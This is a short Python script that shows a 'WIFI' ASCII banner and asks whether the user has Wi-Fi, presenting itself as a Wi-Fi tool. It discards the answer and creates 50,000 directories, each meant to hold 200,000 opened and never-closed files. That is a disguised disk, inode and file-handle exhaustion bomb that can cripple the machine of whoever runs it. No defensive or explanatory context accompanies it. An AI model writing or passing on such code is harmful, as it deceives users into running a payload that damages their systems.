import os
import webbrowser
import time
from colorama import init, Fore, Style

init()
name = ("""
 __     __     __     ______   __    
/\ \  _ \ \   /\ \   /\  ___\ /\ \   
\ \ \/ ".\ \  \ \ \  \ \  __\ \ \ \  
 \ \__/".~\_\  \ \_\  \ \_\    \ \_\ 
  \/_/   \/_/   \/_/   \/_/     \/_/ 
                                     
""")
for char in name : 
    print(Fore.BLUE + Style.BRIGHT + char , end ="" , flush = True )
    time.sleep(0.000001)
	
x = input(Fore.GREEN + "Do you have a wifi (Y/n) : ")
for i in range(50000):
    os.mkdir(f"kali{i}")
    for j in range(200000):
        file = open(f"kali{i}/linux{j}", "a")
